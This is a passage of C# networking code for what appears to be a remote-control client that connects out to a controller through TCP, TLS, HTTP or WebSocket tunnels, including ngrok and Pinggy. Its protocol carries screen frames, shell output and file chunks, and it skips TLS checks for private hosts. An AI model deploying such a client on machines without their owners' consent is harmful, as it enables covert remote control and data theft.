                : Environment.TickCount64 + timeoutMs;
            while (_queue.Count == 0 && !_completed)
            {
                var remaining = deadline == long.MaxValue ? -1
                    : (int)Math.Max(0, deadline - Environment.TickCount64);
                if (remaining == 0) return -1;
                if (!Monitor.Wait(_gate, remaining < 0 ? Timeout.Infinite : remaining)) return -1;
            }
            if (_queue.Count == 0) return 0;
            var head = _queue.First!.Value;
            var take = Math.Min(count, head.Length);
            Buffer.BlockCopy(head, 0, buffer, offset, take);
            if (take == head.Length) _queue.RemoveFirst();
            else
            {
                var rest = new byte[head.Length - take];
                Buffer.BlockCopy(head, take, rest, 0, rest.Length);
                _queue.RemoveFirst();
                _queue.AddFirst(rest);
            }
            _bytes -= take;
            Monitor.PulseAll(_gate);
            return take;
        }
    }

    public void Enqueue(byte[] data, Func<bool> isClosed)
    {
        if (data.Length == 0) return;
        lock (_gate)
        {
            while (!isClosed() && _bytes >= _maxBytes && _queue.Count > 0)
            {
                Monitor.Wait(_gate, 1000);
            }
            if (isClosed()) throw new IOException("tunnel closed");
            _queue.AddLast(data);
            _bytes += data.Length;
            Monitor.PulseAll(_gate);
        }
    }

    public void Complete()
    {
        lock (_gate)
        {
            _completed = true;
            Monitor.PulseAll(_gate);
        }
    }
}

/// <summary>
/// Growable wire buffer with an offset.  TCP reads often return large chunks,
/// but TLS records and tunnel proxies can arrive in 16 KiB pieces.  Appending
/// to a byte[] with Array.Resize each time is quadratic; this buffer doubles
/// its capacity and only compacts when the consumed prefix grows large.
/// </summary>
public sealed class WireBuffer
{
    private byte[] _data;
    private int _pos;
    private int _end;

    public WireBuffer(byte[]? initial = null)
    {
        _data = initial is { Length: > 0 } ? initial : Array.Empty<byte>();
        _end = _data.Length;
    }

    public int Available => _end - _pos;
    public ReadOnlySpan<byte> Span => _data.AsSpan(_pos, Available);

    public void Append(byte[] source, int count)
    {
        if (count <= 0) return;
        if (_end + count > _data.Length)
        {
            var available = Available;
            if (available + count <= _data.Length)
            {
                if (available > 0) Buffer.BlockCopy(_data, _pos, _data, 0, available);
                _pos = 0;
                _end = available;
            }
            else
            {
                var needed = available + count;
                var size = _data.Length < 1 ? 65536 : _data.Length;
                while (size < needed) size = size > int.MaxValue / 2 ? needed : size * 2;
                var next = new byte[size];
                if (available > 0) Buffer.BlockCopy(_data, _pos, next, 0, available);
                _data = next;
                _pos = 0;
                _end = available;
            }
        }
        Buffer.BlockCopy(source, 0, _data, _end, count);
        _end += count;
    }

    public byte[] Take(int count)
    {
        if (count < 0 || count > Available) throw new IOException("wire buffer underrun");
        var data = new byte[count];
        if (count > 0) Buffer.BlockCopy(_data, _pos, data, 0, count);
        _pos += count;
        if (_pos == _end)
        {
            _pos = 0;
            _end = 0;
        }
        else if (_pos >= 65536 && _pos * 2 >= _data.Length)
        {
            var available = Available;
            Buffer.BlockCopy(_data, _pos, _data, 0, available);
            _pos = 0;
            _end = available;
        }
        return data;
    }

    public int FindCrlf()
    {
        var span = Span;
        for (var i = 0; i + 1 < span.Length; i++)
            if (span[i] == '\r' && span[i + 1] == '\n') return i;
        return -1;
    }
}

/// <summary>Socket-shaped connection used by every transport.</summary>
public abstract class Conn : IDisposable
{
    public string Name = "connection";
    public abstract int Read(byte[] buffer, int offset, int count, int timeoutMs);
    public abstract void Write(byte[] buffer, int offset, int count);
    public abstract void ShutdownWrite();
    public abstract void ShutdownBoth();
    public abstract void Close();
    public virtual bool WaitReadable(int timeoutMs) => true;
    public virtual Socket? RawSocket => null;
    public virtual bool IsClosed => false;
    public void Dispose() => Close();

    public void WriteAll(byte[] data) => Write(data, 0, data.Length);
}

public sealed class SocketConn : Conn
{
    private readonly Socket _socket;
    private readonly Stream? _tls;
    private readonly bool _streamMode;
    private volatile bool _closed;
    private int _tlsPeeked = -1;

    public SocketConn(Socket socket, SslStream? tls = null, string name = "socket")
    {
        _socket = socket;
        _tls = tls;
        _streamMode = tls != null;
        Name = name;
    }

    public override Socket RawSocket => _socket;
    public override bool IsClosed => _closed;

    public override bool WaitReadable(int timeoutMs)
    {
        if (_tls != null && _tlsPeeked >= 0) return true;
        try
        {
            if (_socket.Poll(Math.Max(0, timeoutMs) * 1000, SelectMode.SelectRead)) return true;
        }
        catch { return true; }
        if (_tls == null) return false;
        // SslStream may already have decrypted a record into its private
        // buffer, in which case the underlying socket is no longer readable.
        // Peek one byte and keep it for the next Read() so a Ctrl+Z/cancel
        // arriving while a command runs is never missed on a TLS link.
        try
        {
            _tls.ReadTimeout = 1;
            var value = _tls.ReadByte();
            if (value < 0) return true;
            _tlsPeeked = value;
            return true;
        }
        catch (IOException ex) when (IsTimeout(ex)) { return false; }
        catch { return true; }
    }

    public override int Read(byte[] buffer, int offset, int count, int timeoutMs)
    {
        try
        {
            if (!_streamMode)
            {
                if (timeoutMs >= 0)
                {
                    if (!_socket.Poll(timeoutMs * 1000, SelectMode.SelectRead)) return -1;
                    return _socket.Receive(buffer, offset, count, SocketFlags.None);
                }
                // An idle control link must never be mistaken for EOF.  If a
                // stale ReceiveTimeout is still configured, keep waiting.
                while (true)
                {
                    try { return _socket.Receive(buffer, offset, count, SocketFlags.None); }
                    catch (SocketException ex) when (ex.SocketErrorCode is SocketError.TimedOut or SocketError.WouldBlock)
                    {
                        continue;
                    }
                }
            }
            if (_tls != null)
            {
                if (_tlsPeeked >= 0)
                {
                    if (count <= 0) return 0;
                    buffer[offset] = (byte)_tlsPeeked;
                    _tlsPeeked = -1;
                    return 1;
                }
                try { _tls.ReadTimeout = timeoutMs < 0 ? Timeout.Infinite : timeoutMs; } catch { }
                return _tls.Read(buffer, offset, count);
            }
            return -1;
        }
        catch (IOException ex) when (IsTimeout(ex)) { return -1; }
        catch (SocketException ex) when (ex.SocketErrorCode is SocketError.TimedOut or SocketError.WouldBlock)
        {
            return -1;
        }
        catch (ObjectDisposedException) { return 0; }
    }

    public override void Write(byte[] buffer, int offset, int count)
    {
        try
        {
            if (_tls != null)
            {
                _tls.Write(buffer, offset, count);
                return;
            }
            var sent = 0;
            while (sent < count)
            {
                var n = _socket.Send(buffer, offset + sent, count - sent, SocketFlags.None);
                if (n <= 0) throw new IOException("socket closed while sending");
                sent += n;
            }
        }
        catch (IOException ex) when (IsTimeout(ex)) { throw new TimeoutException("send timed out", ex); }
        catch (SocketException ex) when (ex.SocketErrorCode is SocketError.TimedOut or SocketError.WouldBlock)
        {
            throw new TimeoutException("send timed out", ex);
        }
        catch (ObjectDisposedException ex) { throw new IOException("socket closed", ex); }
    }

    public override void ShutdownWrite()
    {
        try { _socket.Shutdown(SocketShutdown.Send); } catch { }
    }

    public override void ShutdownBoth()
    {
        try { _socket.Shutdown(SocketShutdown.Both); } catch { }
    }

    public override void Close()
    {
        if (_closed) return;
        _closed = true;
        try { _tls?.Dispose(); } catch { }
        try { _socket.Dispose(); } catch { }
    }

    private static bool IsTimeout(Exception ex)
    {
        for (var e = ex; e != null; e = e.InnerException!)
            if (e is SocketException se && se.SocketErrorCode is SocketError.TimedOut or SocketError.WouldBlock)
                return true;
        return ex.Message.Contains("timed out", StringComparison.OrdinalIgnoreCase);
    }
}

public static class Protocol
{
    private static readonly object SendLock = new();
    private static readonly ConditionalWeakTable<JsonObject, FastChunk> FastChunks = new();
    public const byte FrameMarker = 0x01;

    private sealed class FastChunk
    {
        public byte[] Data = Array.Empty<byte>();
    }

    /// <summary>Take the already-decoded bytes belonging to a transfer_chunk.</summary>
    public static byte[]? TakeFastChunk(JsonObject msg)
    {
        if (!FastChunks.TryGetValue(msg, out var holder)) return null;
        FastChunks.Remove(msg);
        return holder.Data;
    }

    private static JsonNode? ReadScalar(ref Utf8JsonReader reader)
    {
        return reader.TokenType switch
        {
            JsonTokenType.String => JsonValue.Create(reader.GetString()),
            JsonTokenType.True => JsonValue.Create(true),
            JsonTokenType.False => JsonValue.Create(false),
            JsonTokenType.Null => null,
            JsonTokenType.Number => reader.TryGetInt64(out var number)
                ? JsonValue.Create(number)
                : JsonValue.Create(reader.GetDouble()),
            _ => null
        };
    }

    /// <summary>
    /// Fast path for the only protocol message that carries megabytes of data.
    /// Base64 is decoded straight from UTF-8, so no UTF-16 copy or JsonNode DOM
    /// is built for each 1 MiB file chunk.
    /// </summary>
    private static bool TryParseTransferChunk(byte[] payload, out JsonObject? message,
        out byte[]? data)
    {
        message = null;
        data = null;
        try
        {
            var reader = new Utf8JsonReader(payload, isFinalBlock: true, state: default);
            if (!reader.Read() || reader.TokenType != JsonTokenType.StartObject) return false;
            var isChunk = false;
            byte[]? decoded = null;
            JsonNode? id = null;
            while (reader.Read())
            {
                if (reader.TokenType == JsonTokenType.EndObject) break;
                if (reader.TokenType != JsonTokenType.PropertyName) return false;
                if (reader.ValueTextEquals("type"u8))
                {
                    if (!reader.Read() || reader.TokenType != JsonTokenType.String) return false;
                    if (!reader.ValueTextEquals("transfer_chunk"u8)) return false;
                    isChunk = true;
                }
                else if (reader.ValueTextEquals("id"u8))
                {
                    if (!reader.Read()) return false;
                    id = ReadScalar(ref reader);
                }
                else if (reader.ValueTextEquals("data"u8))
                {
                    if (!reader.Read() || reader.TokenType != JsonTokenType.String) return false;
                    if (reader.HasValueSequence)
                    {
                        decoded = Convert.FromBase64String(reader.GetString() ?? "");
                    }
                    else
                    {
                        var encoded = reader.ValueSpan;
                        var bytes = new byte[Base64.GetMaxDecodedFromUtf8Length(encoded.Length)];
                        var status = Base64.DecodeFromUtf8(encoded, bytes, out var written,
                            out var consumed);
                        if (status != OperationStatus.Done || consumed != encoded.Length)
                            return false;
                        if (written != bytes.Length) Array.Resize(ref bytes, written);
                        decoded = bytes;
                    }
                }
                else
                {
                    if (!reader.Read()) return false;
                    reader.Skip();
                }
            }
            if (!isChunk || decoded == null) return false;
            message = new JsonObject
            {
                ["type"] = "transfer_chunk",
                ["id"] = id?.DeepClone()
            };
            data = decoded;
            return true;
        }
        catch (JsonException) { return false; }
        catch (FormatException) { return false; }
    }

    public static int RecvExact(Conn conn, byte[] buffer, int offset, int count,
        bool stall = false, double? deadlineSeconds = null)
    {
        var got = 0;
        while (got < count)
        {
            int timeoutMs;
            if (deadlineSeconds != null)
            {
                var remaining = deadlineSeconds.Value - DateTimeOffset.UtcNow.ToUnixTimeMilliseconds() / 1000.0;
                if (remaining <= 0) return -1;
                timeoutMs = (int)Math.Max(1, remaining * 1000);
                if (stall) timeoutMs = Math.Min(timeoutMs, Cfg.RecvStallTimeout * 1000);
            }
            else if (got > 0 || stall) timeoutMs = Cfg.RecvStallTimeout * 1000;
            else timeoutMs = -1;

            int n;
            try { n = conn.Read(buffer, offset + got, count - got, timeoutMs); }
            catch (IOException) { return -1; }
            catch (ObjectDisposedException) { return -1; }
            catch (SocketException) { return -1; }
            if (n <= 0) return -1;
            got += n;
        }
        return got;
    }

    public static byte[]? RecvBytes(Conn conn, int count, bool stall = false, double? deadlineSeconds = null)
    {
        var data = new byte[count];
        return RecvExact(conn, data, 0, count, stall, deadlineSeconds) == count ? data : null;
    }

    public static JsonObject? RecvMsg(Conn conn, double? deadlineSeconds = null)
    {
        try
        {
            var header = RecvBytes(conn, 4, false, deadlineSeconds);
            if (header == null) { Trace("header eof"); return null; }
            if (BitConverter.IsLittleEndian) Array.Reverse(header);
            var size = (int)BitConverter.ToUInt32(header, 0);
            if (size < 0 || size > Cfg.MaxMsg) { Trace("bad size " + size); return null; }
            var payload = RecvBytes(conn, size, true, deadlineSeconds);
            if (payload == null) { Trace("short payload " + size); return null; }
            if (TryParseTransferChunk(payload, out var fast, out var raw))
            {
                FastChunks.Add(fast!, new FastChunk { Data = raw! });
                Trace("fast transfer_chunk " + size);
                return fast;
            }
            try
            {
                var node = JsonNode.Parse(payload);
                var obj = node as JsonObject;
                if (obj == null) Trace("not an object " + size);
                return obj;
            }
            catch (Exception ex)
            {
                Trace("json " + size + " bytes=" + Convert.ToHexString(payload, 0, Math.Min(16, payload.Length)) +
                      " " + ex.GetType().Name + ": " + ex.Message);
                throw;
            }
        }
        catch (IOException) { return null; }
        catch (JsonException) { return null; }
        catch (ArgumentException) { return null; }
        catch (ObjectDisposedException) { return null; }
    }

    private static void Trace(string text)
    {
        var flag = (Environment.GetEnvironmentVariable("CMON_TRACE") ?? "").Trim();
        if (flag is "1" or "true" or "yes" or "on") Log.Error("[recv] " + text);
    }

    public static void SendMsg(Conn conn, JsonObject obj)
    {
        var payload = JsonUtil.Serialize(obj);
        var packet = new byte[4 + payload.Length];
        var length = payload.Length;
        packet[0] = (byte)(length >> 24);
        packet[1] = (byte)(length >> 16);
        packet[2] = (byte)(length >> 8);
        packet[3] = (byte)length;
        Buffer.BlockCopy(payload, 0, packet, 4, payload.Length);
        lock (SendLock) SendBounded(conn, packet, 0, packet.Length);
    }

    public static void SendFrame(Conn conn, byte[] jpeg)
    {
        var packet = new byte[5 + jpeg.Length];
        var length = 1 + jpeg.Length;
        packet[0] = (byte)(length >> 24);
        packet[1] = (byte)(length >> 16);
        packet[2] = (byte)(length >> 8);
        packet[3] = (byte)length;
        packet[4] = FrameMarker;
        Buffer.BlockCopy(jpeg, 0, packet, 5, jpeg.Length);
        lock (SendLock) SendBounded(conn, packet, 0, packet.Length);
    }

    public static void SendShellOutput(Conn conn, byte[] data)
    {
        if (data.Length == 0) return;
        try
        {
            SendBounded(conn, data, 0, data.Length, 30,
                DateTimeOffset.UtcNow.ToUnixTimeMilliseconds() / 1000.0 + 300 + data.Length / 16384.0);
        }
        catch (IOException) { }
        catch (ObjectDisposedException) { }
    }

    public static void SendBounded(Conn conn, byte[] data, int offset, int count,
        int stallTimeoutSeconds = Cfg.ScreenSendTimeout, double? deadlineSeconds = null)
    {
        var lastProgress = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds() / 1000.0;
        var sent = 0;
        while (sent < count)
        {
            if (deadlineSeconds != null
                && DateTimeOffset.UtcNow.ToUnixTimeMilliseconds() / 1000.0 > deadlineSeconds.Value)
                throw new IOException("send timed out: transfer made too little progress");
            var take = Math.Min(Cfg.SendChunk, count - sent);
            try
            {
                conn.Write(data, offset + sent, take);
                sent += take;
                lastProgress = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds() / 1000.0;
                continue;
            }
            catch (TimeoutException) { }
            catch (SocketException ex) when (ex.SocketErrorCode is SocketError.TimedOut or SocketError.WouldBlock) { }
            if (DateTimeOffset.UtcNow.ToUnixTimeMilliseconds() / 1000.0 - lastProgress > stallTimeoutSeconds)
                throw new IOException("send stalled: controller stopped reading");
            Thread.Sleep(20);
        }
    }
}

// ===== Transports.cs =====
// Transports.cs - raw TCP, TLS, streaming HTTP, WebSocket, half-duplex HTTP
// and long-poll transports. The client keeps the original automatic
// negotiation order and the CMON2/hello handshake.



public sealed class TransportNotSupportedException : IOException
{
    public TransportNotSupportedException(string message) : base(message) { }
}

/// <summary>
/// A tunnel/proxy accepted the TCP connection but the application behind it
/// is not ready yet (or closed the stream at once).  This is different from a
/// wrong protocol: retrying the same endpoint shortly is the right move.
/// </summary>
public class TransportSoftException : IOException
{
    public TransportSoftException(string message, Exception? inner = null) : base(message, inner) { }
}

/// <summary>HTTP 502/503/504 from a tunnel edge: the tunnel is up, app is not.</summary>
public sealed class TransportTunnelNotReadyException : TransportSoftException
{
    public TransportTunnelNotReadyException(string message) : base(message) { }
}

public static class TunnelHeaders
{
    public static List<string> Build(string host, string? token = null, string role = "control")
    {
        var headers = new List<string>
        {
            $"User-Agent: {Cfg.CmonUserAgent}",
            "Accept: */*",
            "Cache-Control: no-store",
            "ngrok-skip-browser-warning: 1",
            "X-Pinggy-No-Screen: 1",
            $"X-CMon-Role: {role}"
        };
        if (!string.IsNullOrEmpty(token)) headers.Add($"X-CMon-Token: {token}");
        return headers;
    }
}

public static class Tls
{
    public static SslStream WrapClientTls(Socket socket, string host, bool allowSelfSigned = false)
    {
        var verify = EnvTrue("CONTROLLER_TLS_VERIFY");
        var insecure = EnvTrue("CONTROLLER_TLS_INSECURE");
        var privateHost = NetUtil.HostIsPrivate(host);
        var acceptAny = !verify && (insecure || privateHost || allowSelfSigned);

        var stream = new NetworkStream(socket, ownsSocket: false);
        var ssl = new SslStream(stream, leaveInnerStreamOpen: false,
            (sender, certificate, chain, errors) =>
            {
                if (acceptAny) return true;
                if (errors == SslPolicyErrors.None) return true;
                var ca = Environment.GetEnvironmentVariable("CONTROLLER_TLS_CA");
                if (!string.IsNullOrEmpty(ca) && certificate != null)
                {
                    try
                    {
                        using var custom = new X509Chain();
                        custom.ChainPolicy.TrustMode = X509ChainTrustMode.CustomRootTrust;
                        custom.ChainPolicy.CustomTrustStore.Add(X509CertificateLoader.LoadCertificateFromFile(ca));
                        custom.ChainPolicy.RevocationMode = X509RevocationMode.NoCheck;
                        using var leaf = X509CertificateLoader.LoadCertificate(certificate.GetRawCertData());
                        return custom.Build(leaf);
                    }
                    catch { return false; }
                }
                return false;
            });

        var options = new SslClientAuthenticationOptions
        {
            TargetHost = host,
            EnabledSslProtocols = SslProtocols.Tls12 | SslProtocols.Tls13,
            ApplicationProtocols = new List<SslApplicationProtocol> { SslApplicationProtocol.Http11 },
            CertificateRevocationCheckMode = X509RevocationMode.NoCheck
        };
        try
        {
            // Bound the handshake, then return the socket to ordinary blocking
            // reads.  The connection lives for hours and is idle most of the time.
            try { socket.ReceiveTimeout = Cfg.HttpHandshakeTimeout * 1000; } catch { }
            ssl.AuthenticateAsClient(options);
            try { socket.ReceiveTimeout = 0; } catch { }
            if (ssl.NegotiatedApplicationProtocol != default
                && ssl.NegotiatedApplicationProtocol != SslApplicationProtocol.Http11)
                throw new TransportNotSupportedException(
                    $"TLS negotiated {ssl.NegotiatedApplicationProtocol}; this tunnel uses HTTP/1.1");
            return ssl;
        }
        catch (TransportNotSupportedException) { ssl.Dispose(); throw; }
        catch (Exception ex) when (ex is IOException or AuthenticationException)
        {
            ssl.Dispose();
            throw new IOException("TLS handshake failed: " + ex.Message, ex);
        }
    }

    private static bool EnvTrue(string name)
    {
        var value = (Environment.GetEnvironmentVariable(name) ?? "").Trim().ToLowerInvariant();
        return value is "1" or "true" or "yes" or "on";
    }
}

public static class HttpWire
{
    public static (string Head, byte[] Extra) ReadHead(Stream stream, int timeoutMs = Cfg.HttpHandshakeTimeout * 1000)
    {
        var data = new List<byte>(1024);
        var buffer = new byte[4096];
        try { stream.ReadTimeout = timeoutMs; } catch { }
        try
        {
            while (true)
            {
                if (data.Count >= 4)
                {
                    var found = -1;
                    for (var i = 0; i + 3 < data.Count; i++)
                    {
                        if (data[i] == '\r' && data[i + 1] == '\n'
                            && data[i + 2] == '\r' && data[i + 3] == '\n')
                        {
                            found = i;
                            break;
                        }
                    }
                    if (found >= 0)
                    {
                        if (found > Cfg.HttpMaxHeader)
                            throw new IOException("HTTP response headers are too large");
                        var head = Encoding.Latin1.GetString(data.GetRange(0, found).ToArray());
                        var extra = data.GetRange(found + 4, data.Count - found - 4).ToArray();
                        return (head, extra);
                    }
                }
                if (data.Count > Cfg.HttpMaxHeader) throw new IOException("HTTP response headers are too large");
                int n;
                try { n = stream.Read(buffer, 0, Math.Min(4096, Cfg.HttpMaxHeader + 1 - data.Count)); }
                catch (IOException ex) when (IsTimeout(ex))
                {
                    throw new IOException("HTTP handshake timed out", ex);
                }
                if (n <= 0)
                {
                    if (data.Count == 0)
                        throw new TransportSoftException("connection closed at once");
                    throw new IOException("controller closed during the HTTP handshake");
                }
                for (var i = 0; i < n; i++) data.Add(buffer[i]);
            }
        }
        finally
        {
            try { stream.ReadTimeout = Timeout.Infinite; } catch { }
        }
    }

    public static Dictionary<string, string> Headers(IEnumerable<string> lines)
    {
        var headers = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
        foreach (var line in lines)
        {
            if (string.IsNullOrEmpty(line)) continue;
            if (line[0] is ' ' or '\t') throw new IOException("folded HTTP headers are not accepted");
            var idx = line.IndexOf(':');
            if (idx < 0) throw new IOException("malformed HTTP response header");
            var key = line[..idx].Trim().ToLowerInvariant();
            if (key.Length == 0) throw new IOException("empty HTTP response header");
            var value = line[(idx + 1)..].Trim();
            headers[key] = headers.TryGetValue(key, out var old) ? old + "," + value : value;
        }
        return headers;
    }

    public static (int Code, string[] Lines, string[] Status) ParseStatus(string head)
    {
        var lines = head.Split("\r\n");
        if (lines.Length == 0) throw new TransportNotSupportedException("empty HTTP response");
        var status = lines[0].Split(' ', 3, StringSplitOptions.RemoveEmptyEntries);
        if (status.Length < 2 || !int.TryParse(status[1], out var code))
            throw new TransportNotSupportedException("malformed HTTP status line: " + lines[0]);
        return (code, lines, status);
    }

    public static bool IsTimeout(Exception ex)
    {
        for (Exception? e = ex; e != null; e = e.InnerException)
            if (e is SocketException se
                && se.SocketErrorCode is SocketError.TimedOut or SocketError.WouldBlock) return true;
        return ex.Message.Contains("timed out", StringComparison.OrdinalIgnoreCase)
               || ex.Message.Contains("timeout", StringComparison.OrdinalIgnoreCase);
    }

    public static bool IsTunnelNotReady(int code) => code is 502 or 503 or 504;

    public static bool EnvDisabled(string name)
    {
        var value = (Environment.GetEnvironmentVariable(name) ?? "").Trim().ToLowerInvariant();
        return value is "1" or "true" or "yes";
    }
}

/// <summary>Streaming HTTP/1.1 adapter: POST body up, chunked response down.</summary>
public sealed class HttpTunnel : Conn
{
    private readonly Stream _raw;
    private readonly Socket? _socket;
    private readonly BlockingByteQueue _incoming = new();
    private readonly object _sendLock = new();
    private readonly object _wireLock = new();
    private readonly WireBuffer _wire;
    private readonly byte[] _readBuffer = new byte[Cfg.RecvChunk];
    private volatile bool _closed;
    private bool _writeClosed;
    private bool _resourcesClosed;
    private double _lastRx;
    private double _nextPing;
    private readonly Thread _reader;

    public HttpTunnel(Stream raw, Socket? socket, byte[] initial, string name)
    {
        _raw = raw;
        _socket = socket;
        _wire = new WireBuffer(initial);
        Name = name;
        _lastRx = Now();
        _nextPing = _lastRx + Cfg.CmonHttpPing;
        try { _raw.ReadTimeout = 1000; } catch { }
        _reader = new Thread(Pump) { IsBackground = true, Name = name + "-reader" };
        _reader.Start();
    }

    private static double Now() => DateTimeOffset.UtcNow.ToUnixTimeMilliseconds() / 1000.0;

    public override bool IsClosed => _closed;

    public override Socket? RawSocket => _socket;

    public override bool WaitReadable(int timeoutMs) => _incoming.WaitReadable(timeoutMs);

    public override int Read(byte[] buffer, int offset, int count, int timeoutMs)
        => _incoming.Read(buffer, offset, count, timeoutMs);

    public override void Write(byte[] buffer, int offset, int count)
    {
        if (count == 0) return;
        lock (_sendLock)
        {
            if (_closed || _writeClosed) throw new IOException("HTTP tunnel is closed");
            var header = Encoding.ASCII.GetBytes($"{count:x}\r\n");
            var trailer = Encoding.ASCII.GetBytes("\r\n");
            var packet = new byte[header.Length + count + trailer.Length];
            Buffer.BlockCopy(header, 0, packet, 0, header.Length);
            Buffer.BlockCopy(buffer, offset, packet, header.Length, count);
            Buffer.BlockCopy(trailer, 0, packet, header.Length + count, trailer.Length);
            try { RawSend(packet); }
            catch (IOException) { Broken(); throw; }
        }
    }

    public override void ShutdownWrite()
    {
        lock (_sendLock)
        {
            if (_closed || _writeClosed) return;
            _writeClosed = true;
            try { RawSend(Encoding.ASCII.GetBytes("0\r\n\r\n")); }
            catch (IOException) { Broken(); }
        }
    }

    public override void ShutdownBoth()
    {
        ShutdownWrite();
        try { _incoming.Complete(); } catch { }
    }

    public override void Close()
    {
        _closed = true;
        try { _incoming.Complete(); } catch { }
        if (_resourcesClosed) return;
        _resourcesClosed = true;
        try { _raw.Dispose(); } catch { }
        try { _socket?.Dispose(); } catch { }
    }

    private void Broken()
    {
        _closed = true;
        try { _socket?.Shutdown(SocketShutdown.Both); } catch { }
        try { _incoming.Complete(); } catch { }
    }

    private void RawSend(byte[] data)
    {
        var lastProgress = Now();
        var offset = 0;
        while (offset < data.Length)
        {
            try
            {
                _raw.Write(data, offset, data.Length - offset);
                offset = data.Length;
            }
            catch (IOException ex) when (HttpWire.IsTimeout(ex))
            {
                if (Now() - lastProgress > Cfg.HttpSendStallTimeout)
                    throw new IOException("HTTP tunnel send stalled");
                Thread.Sleep(20);
            }
        }
    }

    private void SendHeartbeat()
    {
        lock (_sendLock)
        {
            if (_closed || _writeClosed) return;
            try { RawSend(Encoding.ASCII.GetBytes("1;cmon-ping\r\n \r\n")); }
            catch (IOException) { Broken(); }
        }
    }

    private void ReadMore()
    {
        while (true)
        {
            var now = Now();
            if (now >= _nextPing)
            {
                _nextPing = now + Cfg.CmonHttpPing;
                SendHeartbeat();
            }
            if (now - _lastRx > Cfg.CmonHttpDead)
                throw new IOException("HTTP tunnel peer stopped answering");
            try
            {
                var n = _raw.Read(_readBuffer, 0, _readBuffer.Length);
                if (n <= 0) throw new IOException("HTTP tunnel closed");
                _lastRx = Now();
                lock (_wireLock) _wire.Append(_readBuffer, n);
                return;
            }
            catch (IOException ex) when (HttpWire.IsTimeout(ex))
            {
                if (_closed) throw new IOException("HTTP tunnel closed");
            }
        }
    }

    private byte[] RawRead(int count)
    {
        while (true)
        {
            lock (_wireLock)
            {
                if (_wire.Available >= count) return _wire.Take(count);
            }
            ReadMore();
        }
    }

    private byte[] ReadLine()
    {
        while (true)
        {
            lock (_wireLock)
            {
                var idx = _wire.FindCrlf();
                if (idx >= 0)
                {
                    var line = _wire.Take(idx);
                    _wire.Take(2);
                    return line;
                }
                if (_wire.Available > Cfg.HttpMaxLine) throw new IOException("HTTP chunk line is too large");
            }
            ReadMore();
        }
    }

    private void WriteLocal(byte[] data)
    {
        while (!_closed)
        {
            try
            {
                _incoming.Enqueue(data, () => _closed);
                return;
            }
            catch (IOException)
            {
                if (_closed) throw;
            }
        }
        throw new IOException("HTTP tunnel closed");
    }

    private void Pump()
    {
        try
        {
            while (!_closed)
            {
                var line = ReadLine();
                if (line.Length == 0) continue;
                var text = Encoding.ASCII.GetString(line);
                var semi = text.IndexOf(';');
                var sizeText = (semi >= 0 ? text[..semi] : text).Trim();
                var extensions = (semi >= 0 ? text[(semi + 1)..] : "").ToLowerInvariant();
                if (!int.TryParse(sizeText, System.Globalization.NumberStyles.HexNumber,
                        System.Globalization.CultureInfo.InvariantCulture, out var size))
                    throw new IOException("invalid HTTP chunk size");
                if (size < 0 || size > Cfg.HttpMaxChunk) throw new IOException("HTTP chunk is too large");
                if (size == 0)
                {
                    var trailerBytes = 0;
                    var trailerCount = 0;
                    while (true)
                    {
                        var trailer = ReadLine();
                        trailerBytes += trailer.Length + 2;
                        if (trailerBytes > Cfg.HttpMaxHeader) throw new IOException("HTTP trailers are too large");
                        if (trailer.Length == 0) break;
                        if (++trailerCount > 128) throw new IOException("too many HTTP trailers");
                    }
                    break;
                }
                var heartbeat = extensions.Contains("cmon-ping", StringComparison.Ordinal);
                var remaining = size;
                while (remaining > 0)
                {
                    var piece = RawRead(Math.Min(remaining, Cfg.RecvChunk));
                    if (piece.Length == 0) throw new IOException("HTTP chunk ended early");
                    if (!heartbeat) WriteLocal(piece);
                    remaining -= piece.Length;
                }
                var terminator = RawRead(2);
                if (terminator[0] != '\r' || terminator[1] != '\n')
                    throw new IOException("missing HTTP chunk terminator");
            }
        }
        catch (Exception ex) when (ex is IOException or ObjectDisposedException or ArgumentException)
        {
            Log.Error($"[ws] reader stopped: {ex.GetType().Name}: {ex.Message} closed={_closed}");
        }
        finally
        {
            _incoming.Complete();
        }
    }
}

/// <summary>RFC 6455 WebSocket adapter (client side, masked frames).</summary>
public sealed class WebSocketTunnel : Conn
{
    private readonly Stream _raw;
    private readonly Socket? _socket;
    private readonly bool _serverSide;
    private readonly BlockingByteQueue _incoming = new();
    private readonly object _sendLock = new();
    private readonly object _wireLock = new();
    private readonly WireBuffer _wire;
    private readonly byte[] _readBuffer = new byte[Cfg.RecvChunk];
    private volatile bool _closed;
    private bool _writeClosed;
    private bool _resourcesClosed;
    private double _lastRx;
    private double _nextPing;
    private readonly Thread _reader;

    public WebSocketTunnel(Stream raw, Socket? socket, bool serverSide, byte[] initial, string name)
    {
        _raw = raw;
        _socket = socket;
        _serverSide = serverSide;
        _wire = new WireBuffer(initial);
        Name = name;
        _lastRx = Now();
        _nextPing = _lastRx + Cfg.CmonWsPing;
        try { _raw.ReadTimeout = 1000; } catch { }
        _reader = new Thread(Pump) { IsBackground = true, Name = name + "-reader" };
        _reader.Start();
    }

    private static double Now() => DateTimeOffset.UtcNow.ToUnixTimeMilliseconds() / 1000.0;

    public override bool IsClosed => _closed;
    public override Socket? RawSocket => _socket;
    public override bool WaitReadable(int timeoutMs) => _incoming.WaitReadable(timeoutMs);
    public override int Read(byte[] buffer, int offset, int count, int timeoutMs)
        => _incoming.Read(buffer, offset, count, timeoutMs);

    public override void Write(byte[] buffer, int offset, int count)
    {
        if (count == 0) return;
        lock (_sendLock)
        {
            if (_closed || _writeClosed) throw new IOException("WebSocket tunnel is closed");
            try
            {
                var sent = 0;
                while (sent < count)
                {
                    var take = Math.Min(Cfg.CmonWsMaxFrame, count - sent);
                    var piece = new byte[take];
                    Buffer.BlockCopy(buffer, offset + sent, piece, 0, take);
                    RawSend(MakeFrame(piece, 0x2));
                    sent += take;
                }
            }
            catch (IOException) { Broken(); throw; }
        }
    }

    public override void ShutdownWrite()
    {
        lock (_sendLock)
        {
            if (_closed || _writeClosed) return;
            _writeClosed = true;
            try { RawSend(MakeFrame(Array.Empty<byte>(), 0x8)); }
            catch (IOException) { Broken(); }
        }
    }

    public override void ShutdownBoth()
    {
        ShutdownWrite();
        try { _incoming.Complete(); } catch { }
    }

    public override void Close()
    {
        _closed = true;
        ShutdownWrite();
        try { _incoming.Complete(); } catch { }
        if (_resourcesClosed) return;
        _resourcesClosed = true;
        try { _raw.Dispose(); } catch { }
        try { _socket?.Dispose(); } catch { }
    }

    private void Broken()
    {
        _closed = true;
